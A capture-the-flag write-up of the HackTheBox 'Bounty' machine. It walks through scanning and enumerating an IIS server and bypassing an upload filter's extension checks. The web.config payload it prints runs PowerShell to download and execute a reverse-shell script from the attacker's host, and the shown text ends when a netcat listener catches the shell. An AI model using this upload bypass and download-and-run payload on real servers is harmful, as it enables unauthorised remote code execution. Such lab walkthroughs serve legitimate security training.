# Bounty | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-xbv7f4azqp]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.65.73
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-19 14:15 UTC
Nmap scan report for 10.129.65.73
Host is up (0.22s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|general purpose|specialized
Running (JUST GUESSING): Microsoft Windows Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   224.54 ms 10.10.14.1
2   224.60 ms 10.129.65.73

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 221.91 seconds
```
The machine is running an IIS web server on port 80.

### 2. Enumeration
When visiting the machine's webpage via port 80, there is a nice picture of merlin the wizard. Checking out the headers:
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-xbv7f4azqp]─[~]
└──╼ [★]$ curl --head http://10.129.65.73
HTTP/1.1 200 OK
Content-Length: 630
Content-Type: text/html
Last-Modified: Thu, 31 May 2018 03:46:26 GMT
Accept-Ranges: bytes
ETag: "20ba8ef391f8d31:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Sat, 19 Dec 2020 14:41:02 GMT
```
The server returns the X-Powered-By header as ASP.NET.  
With this information I can dirbust the server for directories and also aspx files.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-xbv7f4azqp]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.65.73/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x aspx -t 30
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.65.73/
[+] Threads:        30
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     aspx
[+] Timeout:        10s
===============================================================
2020/12/19 15:03:05 Starting gobuster
===============================================================
/transfer.aspx (Status: 200)
/UploadedFiles (Status: 301)
/uploadedFiles (Status: 301)
/uploadedfiles (Status: 301)
===============================================================
2020/12/19 15:58:38 Finished
===============================================================
```
Gobuster is able to find a transfer.aspx page, as well as an /uploadedfiles directory, which is not listable. The transfer.aspx page has a file upload form. First I try to upload a html page with some test text, which fails with the error "Invalid File". I try various extensions, starting with txt, aspx, and then .jpg, which succeeds. This tells me the app isn't using file headers to validate uploads and is just fitering based on extension.  
Using burp intruder with the "raft-small-extensions-lowercase.txt" wordlist, I can test some common web extensions and see what is allowed past the filer. The following can be uploaded:
- jpg
- gif
- png
- doc
- config
- xls/xlsx
  
After doing some research into exploits leveraging these file types, a find a blog post detailing how a guy claimed a bug bounty by getting RCE with a .config file upload - https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/:
  
*By uploading a web.config I was able to bypass the blacklist, which blocks files with an executable extension (such as ‘.asp’ and ‘.aspx’).
After setting execution rights to ‘.config’ and then adding asp code in the web.config I was able to execute code.*

### 3. Get a shell
The first step is to create a .config file - there is a template linked to by the article. I can modify it to run powershell, which will download and execute my reverse shell script.
```asp
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.162:8000/rev.ps1')")
%>
```
I set up my web server, and upload the file. When I browse to the file in the /uploadedfiles directory, I get a hit on my web server. Shortly after, I get a connection in my nc listener.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-xbv7f4azqp]─[~/writeups/HackTheBox/HTB_Bounty]
└──╼ [★]$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.162] from (UNKNOWN) [10.129.65.73] 49158
whoami
bounty\merlin
```
